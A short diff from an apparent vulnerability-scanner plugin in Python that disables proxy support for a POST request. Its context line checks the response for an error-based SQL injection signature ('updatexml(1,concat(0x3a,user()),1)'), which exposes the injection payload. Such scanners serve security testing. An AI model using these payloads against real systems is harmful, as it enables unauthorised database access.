@@ -53,14 +53,14 @@ def medusa(Url,RandomAgent,ProxyIp):
         }
 
         s = requests.session()
-        if ProxyIp!=None:
-            proxies = {
-                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-                "http": "http://" + str(ProxyIp)
-            }
-            resp = s.post(payload_url,headers=headers, timeout=6, data=data,proxies=proxies,verify=False)
-        elif ProxyIp==None:
-            resp = s.post(payload_url, headers=headers, timeout=6, data=data,  verify=False)
+        # if ProxyIp!=None:
+        #     proxies = {
+        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+        #         "http": "http://" + str(ProxyIp)
+        #     }
+        #     resp = s.post(payload_url,headers=headers, timeout=6, data=data,proxies=proxies,verify=False)
+        # elif ProxyIp==None:
+        resp = s.post(payload_url, headers=headers, timeout=6, data=data,  verify=False)
         con = resp.text
         code = resp.status_code
         if code== 200 and con.find('错误信息') != -1 and con.find('''(`content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) )''')!=-1 and con.find('执行SQL发生错误') != -1:
